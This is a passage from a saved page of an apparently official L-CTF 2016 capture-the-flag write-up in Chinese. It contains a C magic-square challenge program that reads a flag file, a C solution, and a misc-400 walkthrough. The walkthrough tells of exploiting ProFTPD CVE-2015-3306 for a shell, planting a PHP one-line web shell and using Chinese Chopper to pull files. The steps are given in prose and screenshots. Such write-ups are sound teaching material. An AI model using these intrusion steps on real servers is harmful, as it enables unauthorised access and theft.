alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp preprocessor">#include&nbsp;&lt;stdio.h&gt;</code></div><div class="line number2 index1 alt1"><code class="cpp preprocessor">#include&nbsp;&lt;stdlib.h&gt;</code></div><div class="line number3 index2 alt2"><code class="cpp preprocessor">#include&nbsp;&lt;time.h&gt;</code></div><div class="line number4 index3 alt1"><code class="cpp keyword bold">void</code>&nbsp;<code class="cpp plain">readFlag()</code></div><div class="line number5 index4 alt2"><code class="cpp plain">{</code></div><div class="line number6 index5 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">FILE</code>&nbsp;<code class="cpp plain">*pFile=</code><code class="cpp functions bold">fopen</code><code class="cpp plain">(</code><code class="cpp string">"./flag.txt"</code><code class="cpp plain">,</code><code class="cpp string">"r"</code><code class="cpp plain">);</code></div><div class="line number7 index6 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">pBuf[32]={0};</code><code class="cpp comments">//socat&nbsp;tcp-l:8000,reuseaddr,fork&nbsp;exec:./re2</code></div><div class="line number8 index7 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">fread</code><code class="cpp plain">(pBuf,1,32,pFile);</code></div><div class="line number9 index8 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"%s"</code><code class="cpp plain">,pBuf);</code></div><div class="line number10 index9 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">fclose</code><code class="cpp plain">(pFile);</code></div><div class="line number11 index10 alt2"><code class="cpp plain">}</code></div><div class="line number12 index11 alt1"><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">main()</code></div><div class="line number13 index12 alt2"><code class="cpp plain">{</code></div><div class="line number14 index13 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">i,j;</code></div><div class="line number15 index14 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">a[19*19]&nbsp;=&nbsp;{0};</code></div><div class="line number16 index15 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">b[19][19];</code></div><div class="line number17 index16 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">k;</code></div><div class="line number18 index17 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">setvbuf</code><code class="cpp plain">(stdout,&nbsp;0,&nbsp;2,&nbsp;0);</code></div><div class="line number19 index18 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">setvbuf</code><code class="cpp plain">(stdin,&nbsp;0,&nbsp;2,&nbsp;0);</code></div><div class="line number20 index19 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(k&nbsp;=&nbsp;1;&nbsp;k&nbsp;&lt;=19&nbsp;;&nbsp;k=k+2)</code></div><div class="line number21 index20 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number22 index21 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;k;&nbsp;++i)</code></div><div class="line number23 index22 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number24 index23 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(j&nbsp;=&nbsp;0;&nbsp;j&nbsp;&lt;&nbsp;k;&nbsp;++j)</code></div><div class="line number25 index24 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number26 index25 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">scanf</code><code class="cpp plain">(</code><code class="cpp string">"%d"</code><code class="cpp plain">,&amp;b[i][j]);</code></div><div class="line number27 index26 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">a[(b[i][j]-1)%(k*k)]&nbsp;=&nbsp;1;</code></div><div class="line number28 index27 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number29 index28 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number30 index29 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;k*k;&nbsp;++i)</code></div><div class="line number31 index30 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number32 index31 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code><code class="cpp plain">(a[i]==0)</code></div><div class="line number33 index32 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code>&nbsp;<code class="cpp plain">-1;</code></div><div class="line number34 index33 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number35 index34 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">num;</code></div><div class="line number36 index35 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">srand</code><code class="cpp plain">(</code><code class="cpp functions bold">time</code><code class="cpp plain">(NULL));</code></div><div class="line number37 index36 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">num&nbsp;=&nbsp;</code><code class="cpp functions bold">rand</code><code class="cpp plain">()%k;</code></div><div class="line number38 index37 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">c1=0,c2=0,c3=0,c4=0;</code></div><div class="line number39 index38 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;k;&nbsp;++i)</code></div><div class="line number40 index39 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number41 index40 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">c1&nbsp;+=&nbsp;b[num][i];</code></div><div class="line number42 index41 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number43 index42 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;k;&nbsp;++i)</code></div><div class="line number44 index43 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number45 index44 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">c2&nbsp;+=&nbsp;b[i][num];</code></div><div class="line number46 index45 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number47 index46 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;k;&nbsp;++i)</code></div><div class="line number48 index47 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number49 index48 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(j&nbsp;=&nbsp;0;&nbsp;j&nbsp;&lt;&nbsp;k;&nbsp;++j)</code></div><div class="line number50 index49 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number51 index50 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code><code class="cpp plain">(i==j)&nbsp;c3&nbsp;+=&nbsp;b[i][j];</code></div><div class="line number52 index51 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code>&nbsp;<code class="cpp plain">(i+j==k-1)&nbsp;c4+=b[i][j];</code></div><div class="line number53 index52 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number54 index53 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number55 index54 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code>&nbsp;<code class="cpp plain">(c1&nbsp;!=&nbsp;c2&nbsp;||&nbsp;c3&nbsp;!=&nbsp;c4&nbsp;||&nbsp;c1&nbsp;!=&nbsp;c3)</code></div><div class="line number56 index55 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code>&nbsp;<code class="cpp plain">-1;</code></div><div class="line number57 index56 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number58 index57 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">readFlag();</code></div><div class="line number59 index58 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code>&nbsp;<code class="cpp plain">0;</code></div><div class="line number60 index59 alt1"><code class="cpp plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">编写程序并提交结果：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  cpp"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="cpp preprocessor">#include&nbsp;&nbsp;&lt;stdio.h&gt;</code></div><div class="line number2 index1 alt1"><code class="cpp preprocessor">#include&nbsp;&nbsp;&lt;stdlib.h&gt;</code></div><div class="line number3 index2 alt2"><code class="cpp preprocessor">#define&nbsp;&nbsp;&nbsp;MAXSIZE&nbsp;&nbsp;&nbsp;20</code></div><div class="line number4 index3 alt1"><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">main()</code></div><div class="line number5 index4 alt2"><code class="cpp plain">{</code></div><div class="line number6 index5 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;&nbsp;<code class="cpp plain">matrix[MAXSIZE][MAXSIZE];&nbsp;</code><code class="cpp comments">/*&nbsp;the&nbsp;magic&nbsp;square&nbsp;&nbsp;&nbsp;*/</code></div><div class="line number7 index6 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;&nbsp;<code class="cpp plain">count;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">/*&nbsp;1..n*n&nbsp;counting&nbsp;&nbsp;&nbsp;&nbsp;*/</code></div><div class="line number8 index7 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;&nbsp;<code class="cpp plain">row;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">/*&nbsp;row&nbsp;index&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</code></div><div class="line number9 index8 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;&nbsp;<code class="cpp plain">column;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">/*&nbsp;column&nbsp;index&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</code></div><div class="line number10 index9 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;&nbsp;<code class="cpp plain">order;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">/*&nbsp;input&nbsp;order&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</code></div><div class="line number11 index10 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">line[100];</code></div><div class="line number12 index11 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(order&nbsp;=&nbsp;1;&nbsp;order&nbsp;&lt;=&nbsp;19;&nbsp;order&nbsp;+=&nbsp;2)</code></div><div class="line number13 index12 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">{</code></div><div class="line number14 index13 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">row&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">/*&nbsp;start&nbsp;of&nbsp;from&nbsp;the&nbsp;middle&nbsp;*/</code></div><div class="line number15 index14 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">column&nbsp;=&nbsp;order/2;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">/*&nbsp;of&nbsp;the&nbsp;first&nbsp;row.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</code></div><div class="line number16 index15 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(count&nbsp;=&nbsp;1;&nbsp;count&nbsp;&lt;=&nbsp;order*order;&nbsp;count++)&nbsp;{</code></div><div class="line number17 index16 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">matrix[row][column]&nbsp;=&nbsp;count;&nbsp;</code><code class="cpp comments">/*&nbsp;put&nbsp;next&nbsp;#&nbsp;*/</code></div><div class="line number18 index17 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code>&nbsp;<code class="cpp plain">(count&nbsp;%&nbsp;order&nbsp;==&nbsp;0)&nbsp;&nbsp;</code><code class="cpp comments">/*&nbsp;move&nbsp;down&nbsp;?&nbsp;&nbsp;&nbsp;&nbsp;*/</code></div><div class="line number19 index18 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">row++;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">/*&nbsp;YES,&nbsp;move&nbsp;down&nbsp;one&nbsp;row&nbsp;&nbsp;&nbsp;*/</code></div><div class="line number20 index19 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">else</code>&nbsp;<code class="cpp plain">{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp comments">/*&nbsp;compute&nbsp;next&nbsp;indices&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;*/</code></div><div class="line number21 index20 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">row&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;(row&nbsp;==&nbsp;0)&nbsp;?&nbsp;order&nbsp;-&nbsp;1&nbsp;:&nbsp;row&nbsp;-&nbsp;1;</code></div><div class="line number22 index21 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">column&nbsp;=&nbsp;(column&nbsp;==&nbsp;order-1)&nbsp;?&nbsp;0&nbsp;:&nbsp;column&nbsp;+&nbsp;1;</code></div><div class="line number23 index22 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number24 index23 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number25 index24 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(row&nbsp;=&nbsp;0;&nbsp;row&nbsp;&lt;&nbsp;order;&nbsp;row++)&nbsp;{</code></div><div class="line number26 index25 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code>&nbsp;<code class="cpp plain">(column&nbsp;=&nbsp;0;&nbsp;column&nbsp;&lt;&nbsp;order;&nbsp;column++)</code></div><div class="line number27 index26 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"%d&nbsp;"</code><code class="cpp plain">,&nbsp;matrix[row][column]);</code></div><div class="line number28 index27 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number29 index28 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"\n"</code><code class="cpp plain">);</code></div><div class="line number30 index29 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number31 index30 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">return</code>&nbsp;<code class="cpp plain">0;</code></div><div class="line number32 index31 alt1"><code class="cpp plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">misc 400</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">扫端口和ftp登陆尝试的流量都没啥用。。。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">利用proftp的洞：CVE2015-3306，获得了192.168.138.136的shell，写到web目录下一个1.php一句话。然后通过另外一台机器连菜刀，down下来了两个文件：xor.jpg和whoami.jpg。名字提示很明显，xor，没有挖坑，所以两个文件xor一下得到可运行的python代码，逆向这段代码可获得AES_KEY{}。话说为什么会有人提交这个东西呢……明显格式不对啊……</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">proftpd漏洞利用流量：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01e44faac9ab6f9f8d.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01e44faac9ab6f9f8d.png" title="t0199dd8ed416c49d3c.png" alt="http://p3.qhimg.com/t0199dd8ed416c49d3c.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">然后取得msfshell：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01a33f3a1cf7ea245c.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01a33f3a1cf7ea245c.png" title="t01dea3e4ada542f9cc.png" alt="http://p6.qhimg.com/t01dea3e4ada542f9cc.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">利用msfshell写菜刀一句话：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01bf81ab14a436af5d.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01bf81ab14a436af5d.png" title="t012a92ae1cf72662eb.png" alt="http://p3.qhimg.com/t012a92ae1cf72662eb.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">菜刀连接下载文件，菜刀流量的话，去掉文件头和文件尾的东西就ok了：</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01ddca200a18ca29f6.png" 